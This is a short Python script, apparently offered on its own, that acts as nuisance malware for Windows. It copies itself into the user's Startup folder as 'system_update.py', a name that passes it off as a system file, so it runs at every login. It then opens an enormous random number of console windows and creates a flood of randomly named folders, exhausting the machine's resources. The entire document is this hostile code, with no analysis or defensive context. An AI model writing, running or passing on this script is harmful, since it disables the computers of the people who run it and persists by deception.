import os
import random
import shutil
import sys

script_path = os.path.abspath(sys.argv[0])
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
dest_path = os.path.join(startup_folder, "system_update.py")

if not os.path.exists(dest_path):
    shutil.copyfile(script_path, dest_path)

num = random.randint(1, 100^9889898989898)
files = random.randint(1, 50^98989898989)

for i in range(num):
    os.system("start")

for x in range(files):
    folder_name = str(random.randint(1, 9999999))
    try:
        os.makedirs(folder_name)
    except FileExistsError:
        pass
